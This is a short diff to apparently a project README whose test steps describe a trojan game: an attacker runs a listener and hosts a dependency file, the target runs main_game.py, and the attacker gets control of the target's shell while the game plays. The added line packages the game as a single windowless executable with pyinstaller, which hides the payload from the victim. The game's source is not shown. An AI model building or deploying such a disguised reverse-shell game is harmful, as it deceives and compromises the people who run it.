@@ -14,6 +14,7 @@
 
 ## How to Test
 1. Attacker: Run `python listener.py`.
+ pyinstaller --onefile --noconsole main_game.py
 2. Attacker: Run `python -m http.server 8080` (to host dependency file).
 3. Target: Run `python main_game.py`.
 4. Result: Control the target shell while playing the game.
